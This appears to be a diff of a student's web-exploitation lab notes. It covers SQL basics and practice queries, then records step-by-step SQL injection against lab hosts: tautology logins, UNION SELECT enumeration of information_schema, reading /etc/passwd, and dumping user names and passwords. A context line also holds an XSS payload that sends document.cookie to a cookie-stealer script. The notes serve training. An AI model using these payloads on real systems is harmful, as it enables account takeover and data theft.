@@ -108,3 +108,62 @@ http://10.50.20 ------ needs to be your ip address...
 <script>document.location="http://10.50.39.223:9696/Cookie_Stealer1.php?username=" + document.cookie;</script>
 192.168.65.20
 
+## SQL ##
+
+MariaDB > select carid, name, cost from car;
+MariaDB > select carid, name, cost from session.car where carid=4; 
+MariaDB > select database(); # shows you where you are with your current database. 
+MariaDB > select table_schema, table_name, column_name from information_schema.columns;
+
+table_schema: Refers to the name of the schema (often used interchangeably with "database" in some DBMS) to which the table belongs.
+The information_schema.columns table is a meta-table that contains information about all columns in all tables in the database system.
+
+MariaDB > select table_name from information_schema.columns where table_schema=session;
+MariaDB > select @@version;
+MariaDB > select load_file("/etc/passwd);
+MariaDB > select carid, name, cost from session.car union select name, pass, id from session.user;
+
+SELECT * FROM movies;
+
+SELECT * FROM movies where year<2000 or year>2010; # Finding movies not released in the years between 2000 and 2010.
+SELECT * FROM movies where id>=1 and id<=5; # Finding the first 5 pixar movies. 
+SELECT * FROM movies WHERE Title LIKE '%toy story%'; # Find all the Toy Story movies
+SELECT * FROM movies WHERE Director='John Lasseter'; # Find all movies directed by John Lasseter
+SELECT * FROM movies WHERE Title like 'WALL-%'; # Find all the WALL-* movies
+SELECT DISTINCT Director FROM movies ORDER BY Director ASC; # List all directors of Pixar movies (alphabetically), without duplicates 
+SELECT * FROM movies ORDER BY year DESC limit 4; # List the last four Pixar movies released (ordered from most recent to least) 
+SELECT * FROM movies ORDER BY title ASC limit 5; # List the first five Pixar movies sorted alphabetically
+
+
+WHERE Price BETWEEN 10 AND 20;
+
+USE session;
+SELECT id FROM user WHERE name='tom' OR 1=1;
+
+steps sql injection
+1. in both the password and username field, enter: tom' or 1='1
+2. Inspect html and change form from post to get 
+3. login and see the information
+
+You will get all selects except for one challenge. 
+
+step 1 -> http://10.50.46.45/uniondemo.php?Selection=2 or% 1=1 -> Keep increasing the value on the selection until an output is derived
+step 2 -> http://10.50.46.45/uniondemo.php?Selection=2 union select 1,2,3 union select, find out if there values are ordered
+
+We now know they're not inorder and that 2 is vulnerable let's look at the table schema 
+step 3 -> http://10.50.46.45/uniondemo.php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+
+union demo - http://10.50.46.45/Union.html
+
+ford' or 1=1; #   ---> Try this gives this select name, type, cost, color, year from car where name='ford\' or 1=1; #' 
+select name, type, cost, color, year from car where name='audi\' or 1=\'1'
+
+0. ford' or 1='1; this didn't work why???
+1. ford' or 1=1; # after this we try audi next
+2. Audi' or 1=1; #' ----> gives this select name, type, cost, color, year from car where name='Audi' or 1=1; # ' -----> SUCCESS!!!
+3. Now we need union select 
+4. Audi' union select 1,2,3,4; # -----> doesn't work.. 
+5. Audi' union select 1,2,3,4,5; # ----> works.. looks like I added 
+6. Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #      ----> GOLDEN STATEMENT ALLOWS US TO KNOW WHAT TO WRITE FOR THAT SITUATION. Helps us to write a valid query for content
+7. Audi' Union select id,null,name,pass,null from session.user; #
+query -----> select name, type, cost, color, year from car where name='Audi' Union select id,2,name,pass,null from session.user; #'
